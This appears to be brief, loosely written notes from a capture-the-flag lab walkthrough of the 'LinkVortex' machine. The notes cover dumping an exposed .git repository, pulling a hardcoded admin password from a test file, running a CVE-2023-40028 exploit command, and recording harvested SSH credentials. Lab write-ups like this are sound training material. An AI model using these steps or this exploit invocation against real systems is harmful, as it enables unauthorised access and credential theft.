this directories to login user found in robots.txt 
http://linkvortex.htb/ghost/#/signin
than we found .git in dev.linkvertex.htb
the use GitHach where we found 
cd home/kali/Desktop/tools/GitHack/dev.linkvortex.htb/ghost/core/test/regression/api/admin
grep -n "password" authentication.test.js

admin@linkvertex.htb:OctopiFociPilfer45
then we found it in Dockerfile that we found after GitHack in directories dev.linkvortex.htb
that we open with use CVE
./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb

/var/lib/ghost/config.production.json
credentials to ssh bob@ip:
bob:fibber-talented-worth

